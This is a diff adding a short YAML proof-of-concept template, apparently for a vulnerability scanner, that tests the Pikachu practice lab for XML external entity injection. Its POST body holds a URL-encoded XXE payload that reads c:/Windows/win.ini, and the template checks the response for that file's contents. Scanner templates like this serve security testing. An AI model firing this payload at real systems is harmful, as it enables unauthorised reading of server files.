@@ -1,0 +1,17 @@
+name: poc-yaml-xxe
+
+rules:
+  - method: POST
+    path: "/pikachu/vul/xxe/xxe_1.php"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      xml=%3C%3Fxml+version%3D%221.0%22%3F%3E+%3C%21DOCTYPE+null%5B+%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fc%3A%2F%2FWindows%2Fwin.ini%22%3E%5D%3E+%3Ca%3E%26xxe%3B%3C%2Fa%3E&submit=%E6%8F%90%E4%BA%A4
+    expression: |
+      response.status == 200 && response.body.bcontains(b'for 16-bit app support')
+
+detail:
+  author: xxx
+  links:  |
+    https://www.bilibili.com/video/BV1Aa411t7Rp
